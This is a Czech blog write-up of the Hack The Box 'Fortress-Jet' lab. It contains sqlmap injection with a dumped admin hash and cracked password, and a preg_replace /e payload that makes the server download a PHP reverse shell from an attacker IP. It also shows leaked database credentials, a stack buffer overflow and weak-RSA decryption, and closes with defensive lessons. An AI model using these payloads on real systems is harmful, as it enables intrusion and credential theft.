---
layout: post
author: Tomáš Matějíček
title: "Fortress-Jet"
date: 2020-11-28
tags: linux sql-injection ssh php exploit enumeration
---
## Úvod a kontext

Fortress-Jet není klasický lineární HTB stroj s jedním `user.txt` a jedním `root.txt`. Jde spíš o víceúrovňové prostředí s několika službami a několika nezávislými flagy. Přesto se v něm dá sledovat hlavní technická linka: skrytý admin panel, SQL injection, následné RCE v PHP a potom samostatné lokální úkoly nad binárkami a špatně navrženou kryptografií.

Právě proto má smysl článek číst jako rozbor rozhodovacích bodů, ne jako jeden přímočarý walkthrough. První část vede k webovému shellu jako `www-data`; další fáze už pracují s artefakty nalezenými po shellu, například s binárkou `leak` nebo s klíči uživatele `tony`.

## Počáteční průzkum

### Síťová stopa fortress prostředí

První `nmap` ukazuje, že vedle webu a SSH běží i několik netypických služeb na `5555`, `7777` a `9201`. To je důležitý signál, že půjde o fortress s více podsystémy, ne o běžný jednoúčelový host.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp   open  http     nginx 1.10.3 (Ubuntu)
5555/tcp open  freeciv?
7777/tcp open  cbt?
9201/tcp open  http     BaseHTTPServer 0.3 (Python 2.7.12)
```

### Reverzní DNS a skrytý admin panel

Hlavní stránka je schválně chudá, ale reverzní DNS prozradí doménu `www.securewebinc.jet`. Po zrcadlení webu přes [Httrack](/nastroje/httrack) a prohledání JavaScriptu vyplave cesta `/dirb_safe_dir_rf9EmcEIx/admin/stats.php`. To je typická situace, kdy statický frontend schovává skutečně zajímavou část aplikace.
```text
dig -x $IP @$IP
=> www.securewebinc.jet

httrack http://www.securewebinc.jet/
/js/secure.js
=> /dirb_safe_dir_rf9EmcEIx/admin/stats.php
```
Praktickou roli podobných DNS utilit rozebírám i v článku [host a dig](/nastroje/host-a-dig).

## Analýza zjištění

### SQL injection v admin loginu

Jakmile je admin panel známý, dává smysl otestovat přihlášení. `sqlmap` potvrdí injection v `login.php`, vypíše tabulku `jetadmin.users` a z ní i hash účtu `admin`. Po cracknutí vyjde heslo `Hackthesystem200`, takže je možné přejít do autentizované části bez nutnosti hledat další bypass.
```text
sqlmap -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php --forms -D jetadmin -T users -dump

+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+

=> Hackthesystem200
```

### `preg_replace /e` v `email.php`

Po přihlášení se ukáže druhá zásadní chyba. Funkce pro odesílání mailu pracuje s pravidly ve `preg_replace` a jedno z nich používá modifier `/e`, který v historickém PHP vyhodnocuje replacement jako kód. To dovolí z admin rozhraní zapsat do `uploads/` vlastní PHP soubor a tím si připravit reverzní shell.
```bash
curl 'http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php' \
  -H 'Cookie: PHPSESSID=v9vfqq12gl8sjsah73n355kjc4' \
  --data-raw 'swearwords[%2Fshit%2Fe]=file_put_contents("uploads/rev.php", file_get_contents("http://10.13.14.14:8000/rev.php"));&to=&subject=&message=%3Cp%3Eshit%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1'
```

## Získání přístupu

### Webový shell jako `www-data`

Jakmile je `rev.php` nahrané, první shell vznikne prostým načtením souboru z `uploads/`. Následuje obvyklá stabilizace přes PTY a rychlá lokální enumerace. Tady je dobré si hned všimnout dvou věcí: první flag leží přímo v pracovním adresáři webu a v `/home` je víc uživatelů i binárek určených pro další úlohy.
```text
curl http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/uploads/rev.php

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
cat a_flag_is_here.txt
JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
```

### Co prozradí lokální artefakty

Lokální enumerace tady není jen doplněk. `db.php` odhalí databázové přihlašovací údaje a výpis `/home` ukáže účty `alex`, `membermanager`, `memo` a `tony`, z nichž každý má vlastní artefakty. To potvrzuje, že fortress není lineární: po prvním shellu následuje několik samostatných úloh.
```text
cat db.php
$username = "jet";
$password = "dcr46kdl6zsld68idtyufldro";

ls /home
alex  ch4p  g0blin  membermanager  memo  tony

ls /home/tony
key.bin.enc  keys  secret.enc
```

## Eskalace oprávnění a další servisní úkoly

### Binárka `leak` a flag uživatele `alex`

Jedna z nejzajímavějších lokálních úloh je binárka `leak`. Sama prozradí adresu stacku a tím výrazně zjednoduší exploataci buffer overflow. Stačí dopočítat offset pomocí cyclic patternu, připravit shellcode, vyplnit buffer na 72 bajtů a návratovou adresu přepsat uniklou hodnotou. Výsledkem je shell v kontextu úlohy a přístup k `alex/flag.txt`.
```text
./leak
Oops, I'm leaking! 0x7fffffffe...

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6341356341346341
[*] Exact match at offset 72

cd /home/alex
cat flag.txt
JET{0v3rfL0w_f0r_73h_lulz}
```

### Slabá kryptografie u účtu `tony`

Druhá instruktivní větev leží v `/home/tony`. Veřejný certifikát `public.crt` používá slabé RSA parametry, takže z něj jde dopočítat privátní klíč. Ten pak rozšifruje `key.bin.enc`, čímž vznikne AES heslo pro `secret.enc`. Tahle část je méně o exploitu a více o tom, že špatně zvolená kryptografie umí být stejně zničující jako přímé RCE. Praktickou roli tohoto typu práce rozebírám i v článku [OpenSSL](/nastroje/openssl).
```text
python3 RsaCtfTool.py --publickey /home/tony/keys/public.crt --uncipherfile /home/tony/key.bin.enc
=> Fk+HCXBabN72H+GnoNutYBcMFNB9c+jG4R/RBFyHoFI=

openssl aes-256-cbc -d -in /home/tony/secret.enc -out msg.txt -k "Fk+HCXBabN72H+GnoNutYBcMFNB9c+jG4R/RBFyHoFI="
JET{n3xt_t1m3_p1ck_65537}
```

## Shrnutí klíčových poznatků

- První průlom vznikl až po spojení několika drobných stop: reverzní DNS, skrytý JavaScript a neveřejný admin panel.
- Webová část je klasické řetězení dvou starých chyb: SQL injection pro získání admin hesla a `preg_replace /e` pro přímé spuštění PHP kódu.
- Po prvním shellu se fortress větví do několika samostatných úloh. Lokální enumerace tu neslouží jen k rootu, ale i k identifikaci dalších technik, od buffer overflow po kryptografii.

## Co si odnést do praxe

- Skrytý endpoint v JavaScriptu není obrana. Pokud admin panel existuje, musí být chráněný autentizací a správnou autorizací, ne jen náhodnou cestou v assetu.
- Historické PHP konstrukce jako `preg_replace /e` jsou z bezpečnostního pohledu neobhajitelné. Jakmile se do replacementu dostane útočníkem ovlivnitelný vstup, je z toho přímé RCE.
- Fortress-Jet dobře ukazuje i třetí vrstvu obrany: po prvním shellu rozhodují interní artefakty. Slabé RSA klíče, binárky bez ochrany a challenge utility v produkčním prostředí by útočníkovi neměly zůstávat k dispozici.
